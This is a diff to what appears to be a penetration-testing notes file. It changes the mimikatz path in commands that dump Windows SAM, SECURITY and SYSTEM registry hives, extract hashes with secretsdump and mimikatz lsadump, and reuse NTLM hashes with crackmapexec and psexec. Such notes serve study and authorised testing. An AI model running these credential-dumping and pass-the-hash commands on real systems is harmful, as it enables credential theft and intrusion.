@@ -1066,12 +1066,12 @@ reg save hklm\sam sam.hiv
 reg save hklm\security security.hiv
 reg save hklm\system system.hiv
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL -> to decrypt
-./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
    #+end_example
 
    #+begin_example
-./mimikatz64.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
-./mimikatz64.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
+.\mimikatz.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
+.\mimikatz.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
    #+end_example
 
    ---------------
@@ -1495,7 +1495,7 @@ proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
      1. First we dump password with mimikatz
 
       #+begin_example
- ./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump:sam"
+ .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump:sam"
       #+end_example
 
      2. Then we use the hash with psexec. Notice the format
